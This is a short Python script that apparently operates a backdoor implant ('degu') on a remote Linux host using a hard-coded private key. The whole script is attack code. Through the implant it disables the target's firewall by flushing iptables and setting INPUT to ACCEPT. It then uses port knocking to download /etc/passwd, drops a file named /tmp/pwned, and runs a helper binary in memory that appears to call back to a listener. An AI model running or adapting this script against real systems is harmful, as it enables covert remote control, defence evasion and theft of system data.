#!/usr/bin/env python
import degu
import time

PRIVATE_KEY="f82876e92eaadc0702c16e7deca02ffe25116e84c8ba1e9ebb7423446dbae0534700b14ed3e531a3bc90f852b812df7d79e55190f60c9f2dc6fc0dc67aed0e92"

d = degu.degu("192.168.0.39",priv=PRIVATE_KEY)
d.ghost_exec(b"iptables -P INPUT ACCEPT")
d.ghost_exec(b"iptables -F")

d.knock(b":2222")
time.sleep(2)
aa=d.download(b"/etc/passwd")
print(aa)

d.knock(b":2222")
time.sleep(2)
aa=d.upload(b"/tmp/a",b"/tmp/pwned")

d.knock(b":2222")
time.sleep(2)
aa=d.mem_exec("../helper/cb",b"DEGU 192.168.0.39 11111 ")

